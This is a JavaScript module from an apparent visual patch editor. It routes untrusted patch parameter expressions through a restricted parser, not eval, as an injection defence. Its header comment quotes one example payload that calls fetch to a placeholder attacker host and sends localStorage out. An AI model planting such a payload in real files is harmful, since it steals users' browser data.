/**
 * safeExpression.js - The one way preview code turns a parameter expression
 * into a number.
 *
 * Parameter values arrive from `.rz` patch files, and patches are traded: the
 * gallery publishes them so a visitor can download the source and reopen it
 * here (see ui/publish.js). That makes every `node.params` string untrusted
 * input from a stranger's machine, so it must never reach `eval` or the
 * `Function` constructor — a param of `time + (fetch('//attacker/'+localStorage))`
 * would run on open while still returning a plausible-looking number.
 *
 * UnifiedExpressionSystem already parses these expressions into an AST for
 * shader codegen. Its grammar has no member access, no strings and no
 * assignment; identifiers resolve only against the scope passed in here, and
 * calls only against its builtin math table. Routing preview evaluation
 * through it means arithmetic is all a patch can express.
 */

import { unifiedExpressionSystem } from './UnifiedExpressionSystem.js';

/**
 * The instant previews evaluate `time` at.
 *
 * Thumbnails are redrawn on graph edits, not per frame, so a live clock would
 * make them flicker between unrelated values. Freezing at PI/2 puts sin() at
 * its peak, which reads better than the zero crossing.
 */
export const PREVIEW_TIME = Math.PI / 2;

/**
 * Evaluate a parameter expression against an explicit scope.
 *
 * Anything the expression cannot legally do — unknown identifier, unknown
 * function, syntax error, non-finite result — yields `fallback`, matching how
 * preview code has always treated a broken expression.
 *
 * @param {string}  expr      Expression source, with or without a leading '='.
 * @param {object}  scope     Identifiers the expression may reference.
 * @param {number}  fallback  Returned when the expression cannot be evaluated.
 * @returns {number}
 */
export function evaluateExpressionSafely(expr, scope = {}, fallback = 0) {
  if (typeof expr !== 'string' || expr.trim() === '') return fallback;

  try {
    const result = unifiedExpressionSystem.evaluateCPUOrThrow(expr, scope);
    return Number.isFinite(result) ? result : fallback;
  } catch {
    return fallback;
  }
}

/**
 * Read `node.params[paramName]`, evaluating it when it is an expression.
 *
 * Covers the shape every preview renderer needs: a param that is already a
 * number passes through, a numeric string is parsed, and anything else is
 * treated as an expression over `scope`.
 *
 * @param {object} node          Node whose params to read.
 * @param {string} paramName     Parameter key.
 * @param {number} defaultValue  Used when the param is absent or unusable.
 * @param {object} scope         Identifiers the expression may reference.
 * @returns {number}
 */
export function getNumericParam(node, paramName, defaultValue = 0, scope = {}) {
  const rawValue = node?.params?.[paramName] ?? defaultValue;

  if (typeof rawValue === 'number') {
    return Number.isFinite(rawValue) ? rawValue : defaultValue;
  }

  if (typeof rawValue !== 'string') return defaultValue;

  // Plain numeric strings are the common case and skip the parser entirely.
  const direct = Number(rawValue);
  if (rawValue.trim() !== '' && Number.isFinite(direct)) return direct;

  return evaluateExpressionSafely(rawValue, scope, defaultValue);
}
